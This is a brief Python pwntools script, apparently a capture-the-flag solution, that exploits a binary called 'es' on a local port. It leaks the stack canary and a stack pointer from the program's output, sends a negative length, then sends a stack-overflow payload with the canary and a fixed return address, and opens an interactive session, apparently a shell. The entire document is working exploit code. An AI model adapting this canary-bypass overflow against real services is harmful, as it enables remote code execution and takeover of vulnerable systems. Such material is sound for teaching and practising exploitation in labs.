
from pwn import *

elf=ELF('./es')
context.terminal=['gnome-terminal','-x','sh','-c']
# p=process("./es")
p=remote('localhost',9999)
# p=gdb.debug('./es')
# input()
x=p.recvn(511)
# print(x)
canary=u64(x[264:272])
stack_ptr=u64(x[272:280])
stack_ptr=stack_ptr//16*16
log.info("canary:0x%x"%canary)

# p.recvuntil('\n')
p.sendline("-256")
# p.recvuntil('\n')
write_plt=elf.plt['write']
print(hex(write_plt))

payload=b'a'*264+p64(canary)+p64(stack_ptr)+p64(0x401256)+p64(0)
print(payload)
p.sendline(payload)
# p.sendline("ls")
p.interactive()
